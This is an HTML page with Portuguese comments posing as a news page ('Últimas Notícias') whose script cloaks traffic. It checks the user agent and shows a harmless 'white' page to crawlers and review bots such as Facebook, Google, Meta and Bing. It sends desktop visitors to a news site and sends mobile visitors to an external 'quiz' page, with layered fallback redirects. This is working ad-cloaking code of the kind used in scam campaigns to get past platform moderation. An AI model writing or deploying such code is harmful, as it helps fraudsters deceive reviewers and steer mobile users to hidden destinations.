<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Últimas Notícias</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .loading {
            text-align: center;
            padding: 100px 0;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="loading">Carregando conteúdo...</div>

    <script>
        // Função de redirecionamento à prova de falhas
        function redirectTo(url) {
            // Método 1: Redirecionamento normal
            window.location.href = url;
            
            // Método 2: Fallback após 1.5 segundos
            setTimeout(function() {
                window.location.replace(url);
            }, 1500);
            
            // Método 3: Fallback final (meta refresh)
            setTimeout(function() {
                document.body.innerHTML = `<meta http-equiv="refresh" content="0; url=${url}">`;
            }, 3000);
        }

        // Verificação imediata ao carregar a página
        function checkAccess() {
            // 1. Verifica se é mobile
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi|Windows Phone/i.test(navigator.userAgent);
            
            // 2. Verifica se é um bot conhecido
            const isBot = /bot|facebook|google|meta|twitter|slurp|bing|crawler|spider|curl|wget|validator/i.test(navigator.userAgent.toLowerCase());

            // Se for BOT: mostra conteúdo white (não redireciona)
            if (isBot) {
                document.querySelector('.loading').textContent = "Últimas Notícias";
                // Aqui você pode inserir o conteúdo white page
                return;
            }

            // Se for DESKTOP: redireciona para site white
            if (!isMobile) {
                redirectTo("https://www.atelevisao.com");
                return;
            }

            // Se for MOBILE: redireciona para quiz
            redirectTo("https://avelino-star.github.io/Quiz1/");
        }

        // Inicia a verificação imediatamente
        checkAccess();
    </script>
</body>
</html>
